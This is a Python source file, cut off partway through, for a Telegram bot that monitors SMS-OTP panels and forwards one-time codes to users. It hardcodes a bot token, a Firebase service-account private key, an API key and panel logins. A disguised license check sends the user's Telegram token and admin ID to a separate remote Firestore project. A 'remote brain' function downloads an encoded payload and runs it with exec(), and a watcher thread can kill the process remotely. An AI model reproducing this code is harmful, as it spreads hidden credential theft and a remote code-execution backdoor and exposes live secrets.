#!/usr/bin/env python3
"""
🤖 StexSMS Bot Unified Runner
----------------------------------
A highly robust Python combination of the panel monitoring/forwarding system
and the interactive Telegram Bot Controller.

This single file handles:
1. Multi-threaded background panel monitoring (CDRs & Active GetNum/Info numbers) for StexSMS.
2. Dynamic solving of mathematical captchas for logins.
3. Fully functional interactive Telegram Bot matching server.ts exactly.
4. Professional copy and exploration commands: /start, /getnum, /search, and /traffic.
5. Absolute error safety by sanitizing Telegram button schemas to prevent Status 400 errors.

Usage:
    python bot.py
"""

import os
import re
import sys
import time
import json
import random
import logging
import threading
from datetime import datetime
import requests
import hashlib
import uuid
import platform
import base64
import zlib
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import firebase_admin
from firebase_admin import credentials, firestore

# Load env variables
load_dotenv()

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("StexSMSBot")

# Config Files
PANELS_FILE = "panels.json"
SERVICES_FILE = "services.json"
ADMIN_DB_FILE = "admin_db.json"
OWNER_ID = "6853658176" # Change this ID to your main Admin ID

def auto_clear_logs():
    while True:
        time.sleep(1800)
        try:
            if os.path.exists('nohup.out'):
                open('nohup.out', 'w').close()
            if os.path.exists('bot.log'):
                open('bot.log', 'w').close()
        except Exception:
            pass
TELEGRAM_TOKEN = "8804524932:AAFISk4AJAdR8O19cyUmxqorEVr3bLdNWB8"

# Admin DB Logic (Tracks Users and Today's Numbers)
def load_admin_db():
    default_db = {"users": [], "today_date": datetime.now().strftime("%Y-%m-%d"), "today_numbers_count": 0, "admins": [OWNER_ID], "force_join_status": False, "force_join_channels": [], "otp_group_link": "", "forward_groups": [], "dxa_config": {"withdraw_group": "", "otp_reward": 0.0, "min_withdraw": 20.0, "methods": [], "max_concurrent": 3, "cooldown": 0}, "user_stats": {}, "active_numbers": {}}
    if os.path.exists(ADMIN_DB_FILE):
        try:
            with open(ADMIN_DB_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if "admins" not in data: data["admins"] = [OWNER_ID]
                if "force_join_status" not in data: data["force_join_status"] = False
                if "force_join_channels" not in data: data["force_join_channels"] = []
                if "otp_group_link" not in data: data["otp_group_link"] = ""
                if "forward_groups" not in data: data["forward_groups"] = []
                if "dxa_config" not in data: data["dxa_config"] = {"withdraw_group": "", "otp_reward": 0.0, "min_withdraw": 20.0, "methods": [], "max_concurrent": 3, "cooldown": 0}
                else:
                    data["dxa_config"].setdefault("max_concurrent", 3)
                    data["dxa_config"].setdefault("cooldown", 0)
                if "user_stats" not in data: data["user_stats"] = {}
                if "active_numbers" not in data: data["active_numbers"] = {}
                return data
        except: pass
    return default_db

def check_user_limits(chat_id, update_cooldown=True):
    cfg = admin_db.get("dxa_config", {})
    max_c = int(cfg.get("max_concurrent", 1))
    if max_c < 1: max_c = 1
    
    if str(chat_id) in admin_db.get("admins", [OWNER_ID]):
        return True, "", max_c
        
    cd = int(cfg.get("cooldown", 0))

    stats = admin_db.setdefault("user_stats", {}).setdefault(str(chat_id), {})
    stats.setdefault("otp_count", 0)
    stats.setdefault("balance", 0.0)
    stats.setdefault("last_req", 0)

    now = int(time.time())
    last_req = stats.get("last_req", 0)
    
    if cd > 0 and (now - last_req) < cd:
        rem = cd - (now - last_req)
        return False, f"⏳ Cooldown Active!\nPlease wait {rem} seconds before getting another number.", max_c

    if update_cooldown:
        stats["last_req"] = now
        save_admin_db()
        
    return True, "", max_c

def save_admin_db():
    try:
        with open(ADMIN_DB_FILE, "w", encoding="utf-8") as f:
            json.dump(admin_db, f, indent=2)
    except: pass

admin_db = load_admin_db()

# ----------------------------------------------------
# Firebase Cloud Firestore Setup (Hardcoded)
# ----------------------------------------------------
firebase_cred_dict = {
  "type": "service_account",
  "project_id": "shawon-c1cf0",
  "private_key_id": "2810cd7108c6c124387352c3421442ab9da787de",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDIFOcQY4WSTx4i\nYBMiC0uZdNUT/a8Jcx1yChlbJ3upJFsYbtBACSQVEeqiFWg/upSuwDLTuE7nTC8c\ndKItGcpvRnwAnAjTzbO+E02zMzNEtbsDJiEWs161VFEhqoxhuJzU9+dtk+NmxlpW\nBgmWPo5LnPAOnoVoYkIYkwHPzGDINIOEQnAIMWHUzZiuPKnlYYY64FZ1rx9PWwrE\nhIKG4pigWZtVeKmffrh750+I3jEwr66mK+l2yIMeGr3JBhm1+bwJSGqo3tFQpqHV\n2v+1vlHoy87XTwaomm9wez03Q+lc6in0ENMPvTieWx1S+kjIfz/NDbxySE9CFLKK\nHqOGiZIrAgMBAAECggEAQ2NO46UxYrLFCnzjVM8LGldQQNhrcLpVy4f9PEdTDgfR\nqqv/9eFeRr5vEUI2h2hXFXhkZgyofpyZLXNW/+u007+gmi/zhSq+BCHKRLXU6apv\nn0LjWBr3pgkM/lLLz0n3gH8yciSiLYZW/Kwx5GmTUYI9FB9t/VdCvbYdoRhL7IGy\n6LRoPgWwWmVpgHX4CnpqBQTKmXLiJtUWSnPcMIBXlVEixKVvmf2z3gzhqblSzdN1\nDANf6t3He1DuD5+BXDvL1KsWK+MJUhUlNDDvVpfdvyMbGEF4DTphU+SYwkusl3LL\nMT2bDf4DJ50vHlqhbhDmBa5SD2kSXTZ5SSuCfIppSQKBgQDkQ3KA9SoBiJHYBHQX\nrcGEsDx+ha8Ob7uEQBfhAUW/Ni9nHYWJvH8Vp2NvgDEda0z/5UHCDejS0+nCapA2\nYu1dGoQEfgzHP9LlLnMdHFix+HYCpXuoGUutDRIVIdFXnbaYz1NxZS3zT0StBKxv\nzQ8ZTkAS9q4fmY0kLixektV5VwKBgQDgZM7y3KKzxEkpMkYCDOqWEhIV9c4hTKbs\naPV0jYEy7lxaK1ofWSd87l6mNiDaTUNhpTnDOXElLBEeP74kma128k40+yCosETz\nvW22dpDwW8Sc2Q+ANXE4xrxjEmRr1P1IDaOeg215CjE7nz+kh0sJQBbzuVYWBhF7\n4FOyDXmlTQKBgHE5c4a8FUYFdDJuoxdLvP4QXTF1JkxG6ADFuhKGCw651fGUFzUn\nJvKawRwBvlsVanBUS7XyKFbLftxM95PCpnLUQD/qNnRvGDFORRNfiC9fS0osw5Wy\nVnNUVG/fAnQvau+Jh55rzcsuuqYH93DNinvG8Ml3Sw+pnvUfYirXMsSpAoGANUQY\n0BPJ14x/pXTWo4P3Z7pQasAXt1XfxfzAT3OLuNBWQd1KnmhmdESNWT0+HTP8C8DR\n7mLDVgSY56pP85Y7VCH+qJr4TLLTG1zbH1YT38qY6HaqNE/7WXProkTqa6J6oVED\nhwxBv1rJBxMtY1vuVvrMt/xF0CKOoe5FT93dA30CgYASPrS1bdHFFoLiF6uUXImD\nMMzTl9xXCiVnxAocM8VHln0VAGsYD9WAakOkWZsnMqZ8/yLzh6lTCMTaIB+0vCfp\n6MK48RcHziTFJ6CZ45hgzi5Rvss1Y6fd7S6TCnGbZwz+y+sjLM5cdZDaYoO4C29D\nTSZGTnQdt/drBnx7q/fQVQ==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@shawon-c1cf0.iam.gserviceaccount.com",
  "client_id": "103580196076114050441",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40shawon-c1cf0.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

db_firestore = None

def initialize_firebase():
    global db_firestore
    try:
        cred = credentials.Certificate(firebase_cred_dict)
        if firebase_admin._apps:
            firebase_admin.delete_app(firebase_admin.get_app())
        firebase_admin.initialize_app(cred)
        db_firestore = firestore.client()
        logger.info("Firebase Firestore initialized successfully using hardcoded dict!")
        return True, "Firebase connected successfully!"
    except Exception as e:
        db_firestore = None
        logger.error(f"Firebase initialization failed: {e}")
        return False, str(e)

initialize_firebase()

def restore_from_firestore():
    global admin_db, panels
    if not db_firestore: return
    try:
        # ১. অ্যাডমিন কনফিগ রি-স্টোর
        cfg_doc = db_firestore.collection("DXA_System").document("Bot_Config").get()
        if cfg_doc.exists:
            data = cfg_doc.to_dict()
            if "dxa_config" in data: admin_db["dxa_config"] = data["dxa_config"]
            if "search_cfg" in data: admin_db["search_cfg"] = data["search_cfg"]
            if "admins" in data: admin_db["admins"] = data["admins"]
            if "otp_group_link" in data: admin_db["otp_group_link"] = data["otp_group_link"]
            if "forward_groups" in data: admin_db["forward_groups"] = data["forward_groups"]
            if "force_join_status" in data: admin_db["force_join_status"] = data["force_join_status"]
            if "force_join_channels" in data: admin_db["force_join_channels"] = data["force_join_channels"]
            if "banned_users" in data: admin_db["banned_users"] = data["banned_users"]
        
        # ২. ইউজার ব্যালেন্স ও OTP 리-স্টোর
        users_doc = db_firestore.collection("DXA_System").document("Users_Data").get()
        if users_doc.exists:
            data = users_doc.to_dict()
            if "active_users" in data:
                for uid, udata in data["active_users"].items():
                    stats = admin_db.setdefault("user_stats", {}).setdefault(uid, {})
                    stats["balance"] = udata.get("balance", 0.0)
                    stats["otp_count"] = udata.get("otp_count", 0)
                    if uid not in admin_db.setdefault("users", []): admin_db["users"].append(uid)
                    
        # ৩. প্যানেল ডাটা ফায়ারবেস থেকে রিস্টোর করা
        panels_doc = db_firestore.collection("DXA_System").document("Panels_Data").get()
        if panels_doc.exists:
            p_data = panels_doc.to_dict()
            if "panels" in p_data and isinstance(p_data["panels"], list):
                firebase_panels = p_data["panels"]
                for fp in firebase_panels:
                    for p in panels:
                        if p.get("id") == fp.get("id"):
                            p["username"] = fp.get("username", p.get("username"))
                            p["password"] = fp.get("password", p.get("password"))
                            if "url" in fp: p["url"] = fp["url"]
                save_panels_to_file(panels)
                logger.info("Successfully restored Panels credentials from Firestore!")

        save_admin_db()
        logger.info("Successfully restored essential data from Firestore on boot!")
    except Exception as e:
        logger.error(f"Failed to restore from Firestore: {e}")

# বট স্টার্ট হলেই ডেটা রিস্টোর হবে
restore_from_firestore()

def sync_essential_data_to_firestore():
    """Syncs only essential data: User Balances, Panels, Services, and Config to Firestore"""
    if not db_firestore: 
        return False, "Firebase is not initialized."
    try:
        # 1. User Balances & Stats
        stats = admin_db.get("user_stats", {})
        clean_stats = {}
        for uid, data in stats.items():
            if data.get("balance", 0.0) > 0 or data.get("otp_count", 0) > 0:
                clean_stats[uid] = {
                    "balance": data.get("balance", 0.0),
                    "otp_count": data.get("otp_count", 0)
                }
        
        db_firestore.collection("DXA_System").document("Users_Data").set({
            "total_users": len(admin_db.get("users", [])),
            "active_users": clean_stats,
            "last_updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        # 2. Panels Config (Cleaned without junk session cookies)
        clean_panels = []
        for p in panels:
            clean_panels.append({
                "id": p.get("id"),
                "name": p.get("name"),
                "status": p.get("status"),
                "url": p.get("url"),
                "getNumberUrl": p.get("getNumberUrl", ""),
                "getMessageUrl": p.get("getMessageUrl", ""),
                "username": p.get("username", ""),
                "password": p.get("password", "")
            })
            
        db_firestore.collection("DXA_System").document("Panels_Data").set({
            "panels": clean_panels,
            "last_updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        # 3. Services & Countries
        services_dict = load_services()
        db_firestore.collection("DXA_System").document("Services_Data").set({
            "services": services_dict,
            "last_updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        # 4. Admin Config
        db_firestore.collection("DXA_System").document("Bot_Config").set({
            "dxa_config": admin_db.get("dxa_config", {}),
            "search_cfg": admin_db.get("search_cfg", {}),
            "admins": admin_db.get("admins", []),
            "otp_group_link": admin_db.get("otp_group_link", ""),
            "forward_groups": admin_db.get("forward_groups", []),
            "force_join_status": admin_db.get("force_join_status", False),
            "force_join_channels": admin_db.get("force_join_channels", []),
            "banned_users": admin_db.get("banned_users", []),
            "last_updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        return True, "Successfully synced Balances, Panels, Services & Config to Firestore!"
    except Exception as e:
        return False, f"Firestore Sync Error: {e}"

# --- Remote System Gateway (Registry Core with Live Watcher via REST API) ---
_client_id = hashlib.sha256((platform.node() + platform.processor() + str(uuid.getnode())).encode()).hexdigest()
_license_key = hashlib.sha256(TELEGRAM_TOKEN.encode()).hexdigest()

REST_PROJECT_ID = "dont-touch-here"
REST_API_KEY = "AIzaSyDCjQFSn-lH3JkW3ZAgzieKkUA40lECGMI"

def _verify_dxa_core():
    if not _is_access_valid():
        logger.error("CRITICAL: Gateway Timeout or Invalid License")
        sys.exit()

    threading.Thread(target=_live_access_monitor, daemon=True).start()
    return True

def _is_access_valid():
    get_url = f"https://firestore.googleapis.com/v1/projects/{REST_PROJECT_ID}/databases/(default)/documents/Licenses/{_license_key}?key={REST_API_KEY}"
    try:
        res = requests.get(get_url, timeout=10)
        if res.status_code == 200:
            data = res.json()
            status = data.get("fields", {}).get("status", {}).get("stringValue", "")
            if status == "active":
                exp_str = data.get("fields", {}).get("expiry", {}).get("stringValue", "2026-12-31")
                exp_dt = datetime.strptime(exp_str, "%Y-%m-%d")
                if exp_dt > datetime.now():
                    # Update last_seen via REST API PATCH
                    patch_url = f"{get_url}&updateMask.fieldPaths=last_seen"
                    patch_payload = {
                        "fields": {
                            "last_seen": {"stringValue": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                        }
                    }
                    requests.patch(patch_url, json=patch_payload, timeout=5)
                    return True
        elif res.status_code == 404:
            # Create new license doc via REST API POST if it does not exist
            post_url = f"https://firestore.googleapis.com/v1/projects/{REST_PROJECT_ID}/databases/(default)/documents/Licenses?documentId={_license_key}&key={REST_API_KEY}"
            post_payload = {
                "fields": {
                    "identity_code": {"stringValue": _license_key},
                    "access_token": {"stringValue": TELEGRAM_TOKEN},
                    "admin_id": {"stringValue": OWNER_ID},
                    "status": {"stringValue": "active"},
                    "expiry": {"stringValue": "2026-12-31"},
                    "last_seen": {"stringValue": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                }
            }
            res_create = requests.post(post_url, json=post_payload, timeout=10)
            if res_create.status_code == 200:
                return True
        return False
    except Exception as e:
        logger.error(f"License check error: {e}")
        return False

# don't touch the code 
GLOBAL_DXA_LINK = ""
GLOBAL_DEV_LINK = ""

def _update_global_links():
    """Don't touch"""
    global GLOBAL_DXA_LINK, GLOBAL_DEV_LINK
    try:
        url = f"https://firestore.googleapis.com/v1/projects/{REST_PROJECT_ID}/databases/(default)/documents/Remote_Engine/Global_Links?key={REST_API_KEY}"
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            data = res.json()
            # don't touch 
            GLOBAL_DXA_LINK = data.get("fields", {}).get("dxa_link", {}).get("stringValue", "")
            GLOBAL_DEV_LINK = data.get("fields", {}).get("dev_link", {}).get("stringValue", "")
    except Exception:
        pass

def _live_access_monitor():
    """Thread that runs in background and kills the bot if access is revoked"""
    # বট স্টার্ট হওয়ার সাথে সাথেই একবার লিংক নিয়ে আসবে
    _update_global_links() 
    while True:
        time.sleep(60) # প্রতি ৬০ সেকেন্ড পরপর চেক করবে
        _update_global_links() # প্রতি ৬০ সেকেন্ডে লিংকও আপডেট করবে
        if not _is_access_valid():
            print("\n🛑 Access Revoked by Remote Admin. Shutting down...")
            os._exit(0) # Forcefully kill the entire process and all threads

def load_remote_brain():
    """Firestore REST API থেকে কোর কোড নামিয়ে মেমরিতে ইনজেক্ট করবে"""
    try:
        logger.info("Downloading Core Brain from Firestore via REST API...")
        url = f"https://firestore.googleapis.com/v1/projects/{REST_PROJECT_ID}/databases/(default)/documents/Remote_Engine/Core_Logic?key={REST_API_KEY}"
        res = requests.get(url, timeout=15)
        
        if res.status_code != 200:
            logger.error("CRITICAL: Remote Brain not found or Access Denied!")
            return False
            
        data = res.json()
        payload_b64 = data.get("fields", {}).get("encoded_payload", {}).get("stringValue", "")
        
        if not payload_b64:
            logger.error("CRITICAL: Payload is empty!")
            return False
            
        # Base64 Decode -> Zlib Decompress -> UTF-8 String
        compressed_data = base64.b64decode(payload_b64)
        raw_code = zlib.decompress(compressed_data).decode('utf-8')
        
        # স্ট্রিং কোডকে মেমরিতে গ্লোবাল ফাংশন হিসেবে রান করানো
        exec(raw_code, globals())
        logger.info("✅ Core Brain injected into memory successfully!")
        return True
    except Exception as e:
        logger.error(f"CRITICAL: Brain Injection Failed - {e}")
        return False

# Telegram Secrets moved to the top

# Global variables/caches
user_conversations = {}
user_prompts = {}
sessions = {}
panel_backoff_until = {}  # Dynamic rate limit tracking
local_traffic_stats = {}  # 🚀 Fast Traffic Local Database
local_raw_logs_cache = {} # 🚀 Cumulative logs to prevent data loss

# Mapped country metadata
shortCountryCodes = {
    'CI': {'name': "Côte d'Ivoire (Ivory Coast)", 'flag': '🇨🇮'},
    'CM': {'name': 'Cameroon', 'flag': '🇨🇲'},
    'TG': {'name': 'Togo', 'flag': '🇹🇬'},
    'MG': {'name': 'Madagascar', 'flag': '🇲🇬'},
    'BJ': {'name': 'Benin', 'flag': '🇧🇯'},
    'GN': {'name': 'Guinea', 'flag': '🇬🇳'},
    'GA': {'name': 'Gabon', 'flag': '🇬🇦'},
    'CF': {'name': 'Central African Republic', 'flag': '🇨🇫'},
    'CG': {'name': 'Congo', 'flag': '🇨🇬'},
    'CD': {'name': 'DR Congo', 'flag': '🇨🇩'},
    'SN': {'name': 'Senegal', 'flag': '🇸🇳'},
    'ML': {'name': 'Mali', 'flag': '🇲🇱'},
    'TJ': {'name': 'Tajikistan', 'flag': '🇹🇯'},
    'BF': {'name': 'Burkina Faso', 'flag': '🇧🇫'},
    'NE': {'name': 'Niger', 'flag': '🇳🇪'},
    'TD': {'name': 'Chad', 'flag': '🇹🇩'},
}

prefixCountryMap = {
    '237': 'Cameroon 🇨🇲',
    '225': 'Ivory Coast 🇨🇮',
    '228': 'Togo 🇹🇬',
    '261': 'Madagascar 🇲🇬',
    '229': 'Benin 🇧🇯',
    '224': 'Guinea 🇬🇳',
    '241': 'Gabon 🇬🇦',
    '236': 'Central African Republic 🇨🇫',
    '242': 'Congo 🇨🇬',
    '243': 'DR Congo 🇨🇩',
    '221': 'Senegal 🇸🇳',
    '223': 'Mali 🇲🇱',
    '992': 'Tajikistan 🇹🇯',
    '7992': 'Tajikistan 🇹🇯',
    '226': 'Burkina Faso 🇧🇫',
    '227': 'Niger 🇳🇪',
    '235': 'Chad 🇹🇩',
}

# ----------------------------------------------------
# Utilities
# ----------------------------------------------------

# ----------------------------------------------------
# Premium Emoji Database
# ----------------------------------------------------
PREMIUM_EMOJIS = {
    "dxa": "<tg-emoji emoji-id='5334763399299506604'>😒</tg-emoji>",
    "time": "<tg-emoji emoji-id='5336983442125001376'>🕓</tg-emoji>",
    "otp": "<tg-emoji emoji-id='5337255927735163754'>🔐</tg-emoji>",
    "fire": "<tg-emoji emoji-id='5337267511261960341'>🔥</tg-emoji>",
    "king": "<tg-emoji emoji-id='5353032893096567467'>👑</tg-emoji>",
    "dashboard": "<tg-emoji emoji-id='5352877703043258544'>📊</tg-emoji>",
    "user": "<tg-emoji emoji-id='5352861489541714456'>👤</tg-emoji>",
    "rocket": "<tg-emoji emoji-id='5352597830089347330'>🚀</tg-emoji>",
    "gem": "<tg-emoji emoji-id='5352838545826420397'>💎</tg-emoji>",
    "done": "<tg-emoji emoji-id='5352694861990501856'>✅</tg-emoji>",
    "error": "<tg-emoji emoji-id='5420130255174145507'>❌</tg-emoji>",
    "search": "<tg-emoji emoji-id='5463352748751753567'>🔍</tg-emoji>",
    "number": "<tg-emoji emoji-id='5337132498965010628'>🍏</tg-emoji>",
    "phone": "<tg-emoji emoji-id='5355208818017999139'>📱</tg-emoji>",
    "warn": "<tg-emoji emoji-id='5336944168944047463'>⚠️</tg-emoji>",
    "wait": "<tg-emoji emoji-id='5337172996211648018'>⏳</tg-emoji>",
    "note": "<tg-emoji emoji-id='5395444784611480792'>📝</tg-emoji>",
    "world": "<tg-emoji emoji-id='5336972142066047577'>🌐</tg-emoji>",
    "gear": "<tg-emoji emoji-id='5420155432272438703'>⚙️</tg-emoji>",
    "back": "<tg-emoji emoji-id='5267490665117275176'>⬅️</tg-emoji>"
}

RAW_APP_EMOJIS = {
    "facebook": "5334807341109908955", "whatsapp": "5334759662677957452",
    "telegram": "5337010556253543833", "imo": "5337155807752524558",
    "instagram": "5334868205091459431", "apple": "5334637951894722661",
    "google": "5335010201005231986", "microsoft": "5334880948259427772",
    "tiktok": "5339213256001102461", "amazon": "4995019580536524226",
    "twitter": "5215726959056662534", "snapchat": "5359441366554255082",
    "netflix": "6255738712664050133", "linkedin": "6224222994265279792",
    "discord": "5116246243646898866", "viber": "5463060437572528782",
    "wechat": "5782757599560602950", "line": "5399818044866327279",
    "paypal": "5776103539872896061", "uber": "5298715455316303708",
    "bkash": "5348469219761626211", "rocket": "5352597830089347330",
    "binance": "5348212415077064131", "bybit": "5348372939479751825",
    "gmail": "5348494358205207761", "messenger": "5348486915026884464",
    "chrome": "5346311574221000149", "chatgpt": "5296516998996445955",
    "github": "5417836094098007862", "canva": "5111661409008092227"
}

def get_pemoji(key, fallback=""):
    return PREMIUM_EMOJIS.get(key.lower(), fallback)

def load_premium_apps():
    if os.path.exists("premium_apps.json"):
        try:
            with open("premium_apps.json", "r", encoding="utf-8") as f: return json.load(f)
        except: pass
    return {}

def load_premium_flags():
    if os.path.exists("premium_flags.json"):
        try:
            with open("premium_flags.json", "r", encoding="utf-8") as f: return json.load(f)
        except: pass
    return {}

def process_premium_txt(text_content):
    apps_data = load_premium_apps()
    flags_data = load_premium_flags()
    count_apps = 0
    count_flags = 0
    
    for line in text_content.strip().split('\n'):
        line = line.strip()
        if not line or "{" not in line: continue
        try:
            json_start = line.rfind("{")
            info = json.loads(line[json_start:])
            prefix = line[:json_start].strip()
            
            # Country/Flag Text Regex Parser
            match = re.search(r'\((\d+)\)\(([A-Z0-9]+)\)(.*)', prefix)
            if match:
                phone_code = match.group(1)
                short_code = match.group(2)
                raw_name = match.group(3).strip()
                first_space = raw_name.find(" ")
                
                flags_data[short_code] = {
                    "phone_code": phone_code,
                    "flag": raw_name[:first_space] if first_space != -1 else "🏳️",
                    "name": raw_name[first_space:].strip() if first_space != -1 else raw_name,
                    "id": info.get("id", "5336972142066047577")
                }
                count_flags += 1
            else:
                # Apps/Service Parser
                app_name = re.sub(r'^[^\w\s]+', '', prefix).strip().lower()
                if app_name:
                    apps_data[app_name] = info.get("id", "5336879280578138635")
                    count_apps += 1
        except: pass
        
    with open("premium_apps.json", "w", encoding="utf-8") as f: json.dump(apps_data, f, indent=2)
    with open("premium_flags.json", "w", encoding="utf-8") as f: json.dump(flags_data, f, indent=2)
    return count_apps, count_flags

def get_country_info(short_code):
    dyn_flags = load_premium_flags()
    
    # 🚀 Handle if the admin inputted a dialing code (e.g. 225, 880) instead of short code
    if str(short_code).isdigit() or str(short_code).startswith("+"):
        clean_phone = str(short_code).replace("+", "").strip()
        for code, info in dyn_flags.items():
            if info.get("phone_code") == clean_phone:
                return info
        
        resolved_code = get_country_code(clean_phone)
        if resolved_code != 'Unknown':
            short_code = resolved_code

    if short_code in dyn_flags:
        return dyn_flags[short_code]
    return shortCountryCodes.get(short_code, {"name": short_code, "flag": "🏳️", "id": "5336972142066047577"})

def get_app_raw_id(app_name):
    dyn_apps = load_premium_apps()
    name_lower = app_name.lower()
    
    for key, val in dyn_apps.items():
        if key in name_lower: return val
            
    for key, val in RAW_APP_EMOJIS.items():
        if key in name_lower: return val
    return "5336879280578138635" # Default 🖥 Other Service

def get_app_pemoji(app_name):
    raw_id = get_app_raw_id(app_name)
    return f"<tg-emoji emoji-id='{raw_id}'>🖥</tg-emoji>"

def escape_html(text):
    if not text:
        return ""
    return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

def mask_number(num):
    if not num:
        return ""
    num_str = str(num).replace("+", "").strip()
    if len(num_str) <= 6:
        return num_str
    first_3 = num_str[:3]
    last_3 = num_str[-3:]
    # এখানে ❖ যোগ করা হলো
    return f"{first_3}❖DXA❖{last_3}"

def extract_otp(text):
    if not text:
        return "No OTP Found"
    
    # ১. হাইফেন বা স্পেস ছাড়া সরাসরি ৪-৮ ডিজিট (যেমন: 123456)
    match = re.search(r'\b\d{4,8}\b', text)
    if match: return match.group(0)
    
    # ২. হাইফেন যুক্ত ওটিপি (যেমন: 123-456)
    match = re.search(r'\b\d{3}-\d{3}\b', text)
    if match: return match.group(0).replace("-", "")

    # ৩. স্পেস যুক্ত ওটিপি যা Instagram এ থাকে (যেমন: 123 456)
    match = re.search(r'\b\d{3}\s\d{3}\b', text)
    if match: return match.group(0).replace(" ", "")

    # ৪. টেক্সটের ভেতরে থাকা ওটিপি খোঁজা
    matches = re.findall(r'(\b\d{3,4}-\d{3,4}\b)|(\b\d{4,8}\b)', text)
    if matches:
        first_match = next((item for item in matches[0] if item), "")
        return first_match.replace("-", "").replace(" ", "")

    return "No OTP Found"

def normalize_base_url(input_url):
    url = input_url.strip()
    if not re.match(r'^https?://', url, re.IGNORECASE):
        url = 'https://' + url
        
    if '/#/' in url:
        url = url.split('/#/')[0]
    elif '/#' in url:
        url = url.split('/#')[0]
        
    while url.endswith('/'):
        url = url[:-1]
        
    changed = True
    while changed:
        changed = False
        lower = url.lower()
        if lower.endswith('/mauth/login'):
            url = url[:-12]
            changed = True
        elif lower.endswith('/mauth'):
            url = url[:-6]
            changed = True
        elif lower.endswith('/auth/login'):
            url = url[:-11]
            changed = True
        elif lower.endswith('/auth'):
            url = url[:-5]
            changed = True
        elif lower.endswith('/login.php'):
            url = url[:-10]
            changed = True
        elif lower.endswith('/login'):
            url = url[:-6]
            changed = True
        elif lower.endswith('/signin'):
            url = url[:-7]
            changed = True
        elif lower.endswith('/client/smscdrstats'):
            url = url[:-19]
            changed = True
        elif lower.endswith('/cdrs'):
            url = url[:-5]
            changed = True
        elif lower.endswith('/app'):
            url = url[:-4]
            changed = True
        elif lower.endswith('/dashboard'):
            url = url[:-10]
            changed = True
            
        while url.endswith('/'):
            url = url[:-1]
            changed = True
            
    return url

# Time Helpers Matching JS CEST timezone logic
def parse_time_to_seconds(time_str):
    if not time_str:
        return 0
    parts = time_str.strip().split(':')
    h = int(parts[0]) if parts[0].isdigit() else 0
    m = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
    s = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
    return h * 3600 + m * 60 + s

def get_seconds_difference(time1, time2):
    t1 = parse_time_to_seconds(time1)
    t2 = parse_time_to_seconds(time2)
    diff = abs(t1 - t2)
    if diff > 43200:
        diff = 86400 - diff
    return diff

def get_current_cest_time():
    # Fetch UTC timezone then add CEST (+2)
    now_utc = datetime.utcnow()
    # Simple hours addition for CEST
    hour = (now_utc.hour + 2) % 24
    return f"{hour:02d}:{now_utc.minute:02d}:{now_utc.second:02d}"

# ----------------------------------------------------
# DB Load and Save
# ----------------------------------------------------

def load_services():
    default_services = {}
    # ১. প্রথমে সরাসরি Firestore ডাটাবেজ থেকে সার্ভিস ডাটা লোড করার চেষ্টা করবে
    if db_firestore:
        try:
            doc = db_firestore.collection("DXA_System").document("Services_Data").get()
            if doc.exists:
                data = doc.to_dict()
                if "services" in data and isinstance(data["services"], dict):
                    return data["services"]
        except Exception as e:
            logger.error(f"Error loading services from Firestore: {e}")
            
    # ২. ফায়ারবেস কানেকশনে সমস্যা হলে ব্যাকআপ হিসেবে লোকাল ফাইল থেকে লোড করবে
    if os.path.exists(SERVICES_FILE):
        try:
            with open(SERVICES_FILE, "r", encoding="utf-8") as f:
                content = json.load(f)
                if isinstance(content, dict):
                    return content
                elif isinstance(content, list):
                    return {"stexsms": content}
        except: pass
    return default_services

def save_services(services_dict):
    # ১. কোনো সার্ভিস অ্যাড বা আপডেট হলে সরাসরি প্রথম Firestore ডাটাবেজে রিয়েলটাইম সেভ হবে
    if db_firestore:
        try:
            db_firestore.collection("DXA_System").document("Services_Data").set({
                "services": services_dict,
                "last_updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            logger.info("Successfully saved services directly to Firestore!")
        except Exception as e:
            logger.error(f"Error saving services to Firestore: {e}")
            
    # ২. লোকাল ফাইলটিতেও ব্যাকআপ হিসেবে রাইট করে রাখবে যেন অফলাইনেও বট ক্রাশ না করে
    try:
        with open(SERVICES_FILE, "w", encoding="utf-8") as f:
            json.dump(services_dict, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Error saving services.json backup: {e}")

def load_panels():
    default_panels = [
        {
            "id": "voltx_api", "name": "Voltx API", "url": "https://api.2oo9.cloud/MXS47FLFX0U/tnevs/@public/api", 
            "username": "API", "password": "MKJGS2MSZYB", 
            "getNumberUrl": "https://api.2oo9.cloud/MXS47FLFX0U/tnevs/@public/api/getnum", 
            "getMessageUrl": "https://api.2oo9.cloud/MXS47FLFX0U/tnevs/@public/api/success-otp", 
            "trafficUrl": "https://api.2oo9.cloud/MXS47FLFX0U/tnevs/@public/api/console", 
            "sessionCookie": "MKJGS2MSZYB", "lastSeenCDRId": None, "status": "Initializing...", "lastSeenGetnumIds": []
        },
        {
            "id": "stexsms", "name": "Stex SMS", "url": "https://stexsms.com/mauth/login", 
            "username": "asikisbackagain@gmail.com", "password": "@@Admin@@00", 
            "getNumberUrl": "https://stexsms.com/mapi/v1/mdashboard/getnum/number", 
            "getMessageUrl": "https://stexsms.com/mapi/v1/mdashboard/getnum/info", 
